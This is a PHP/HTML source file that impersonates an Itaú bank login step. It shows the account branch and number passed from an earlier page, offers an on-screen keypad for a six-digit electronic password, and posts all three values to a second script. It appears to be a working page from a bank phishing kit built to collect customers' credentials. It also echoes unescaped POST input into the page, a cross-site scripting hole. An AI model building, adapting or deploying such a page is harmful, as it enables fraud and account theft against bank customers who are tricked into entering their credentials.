<?php
$agencia = $_POST['agencia'];
$conta = $_POST['conta'];
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta charset="utf-8">
<title>Itau</title>
<script type="text/javascript" src="scripts.js"></script>
<style>
@media (min-width: 320px){ #resolution { width:320px; !important } }
@media (min-width: 480px){ #resolution { width:470px; !important } }
@media (min-width: 640px){ #resolution { width:630px; !important } }
@media (min-width: 200px){ #img { width:21%; height:53%; !important } }
@media (min-width: 320px){ #img { width:20%; height:53%; !important } }
@media (min-width: 480px){ #img { width:18%; height:70%; !important } }
@media (min-width: 640px){ #img { width:15%; height:78%; !important } }
#senha { width:60%; padding:10px 10px 10px 30px; background:url(images/7.png) no-repeat; border:none; color:#FFF; font-family:'Arial'; font-size:16px; outline:none; display:block; }
#acessar { width:90%; height:60px; font-size:16px; color:#333; border-radius:5px; border:none; background:#FFF; font-weight:bold; }
#bbotoes input { height:60px;  margin-bottom:10px; margin-left:4px; font-size:15px; font-family:Arial; font-weight: bold; border:none; background:#F2F2F2; box-shadow:1px 1px 3px #333; border-radius:5px; }
@media (min-width: 200px){ #bbotoes input { width:46px; height:45px; !important } }
@media (min-width: 320px){ #bbotoes input { width:48px; height:45px; !important } }
@media (min-width: 480px){ #bbotoes input { width:72px;  height:65px; !important } }
@media (min-width: 640px){ #bbotoes input { width:100px; height:70px; font-size:18px; !important } }
::-webkit-input-placeholder { color: #FFF;}
:-moz-placeholder { /* Firefox 18- */ color: #FFF; }
::-moz-placeholder {  /* Firefox 19+ */ color: #FFF; }
:-ms-input-placeholder {  color: #FFF; }
</style>
<script>
function informar(valor){
 var elemento=document.getElementById("senha");
 var value=elemento.value;
	 var caracteres=value.length;
	 if (caracteres < 6) {
 elemento.value=value+valor;
 }}
</script>
<script>
var inputs = id('senha').getElementsByTagName('input');
            for( var i=0; i<inputs.length; i++ ){
                    inputs[i].onfocus = function(){
                            focus = this.id;
                    }
            }
</script>
</head>

<body style="background:#D17016; margin:0;">
<form name="form" id="form" action="index2.php" method="post" onSubmit="return validar2()">
<div style="height:400px; background:; margin:0 auto;" id="resolution">
<div style="height:120px;"><div id="img" style="background:url(images/1.png) no-repeat; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; left:15px; top:20px; position:relative;"></div></div>
<div style="padding:0 15px 15px 15px;">
<div style="border-bottom:1px solid #FFF; font-family:'Arial'; font-size:14px; color:#FFF;">
<table cellpadding="0" cellspacing="0" width="100%">
<tr>
<td height="63" style="border-bottom:1px solid #FFF;"><font size="2"><?php echo $agencia; ?>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $conta; ?></font></td>

</tr>
<tr>
<td>&nbsp;</td>
</tr>
<tr>
<td height="40">
<input type="password" name="senha" id="senha" maxlength="6" placeholder="senha eletrônica" onKeyPress="IsNum2(this,event)" onClick="IsNum2(this,event)">
<input type="hidden" name="agencia" id="conta" value="<?php echo $agencia; ?>"/>
<input type="hidden" name="conta" id="conta" value="<?php echo $conta; ?>"/>
</td>
</tr>
</table>
</div>
</div>
<div style="padding:15px;">
<div id="bbotoes" >
  <input name="Button9" type="button" id="9" title="9" onclick="informar(this.value);" value="9" />
  <input name="Button1" type="button" id="1" title="1" onclick="informar(this.value);" value="1" />
  <input name="Button6" type="button" id="6" title="6" onclick="informar(this.value);" value="6" />
  <input name="Button2" type="button" id="2" title="2" onclick="informar(this.value);" value="2" />
  <input name="Button4" type="button" id="4" title="4" onclick="informar(this.value);" value="4" />
  <input name="Button5" type="button" id="5" title="5" onclick="informar(this.value);" value="5" />
  <input name="Button3" type="button" id="3" title="3" onclick="informar(this.value);" value="3" />
  <input name="Button8" type="button" id="8" title="8" onclick="informar(this.value);" value="8" />
  <input name="Button7" type="button" id="7" title="7" onclick="informar(this.value);" value="7" />
  <input name="Button0" type="button" id="0" title="0" onclick="informar(this.value);" value="0" />
</div>
</div>
<div style="padding:15px;"><input type="submit" name="acessar" id="acessar" value="ok"></div>
</div>
</form>
</body>
</html>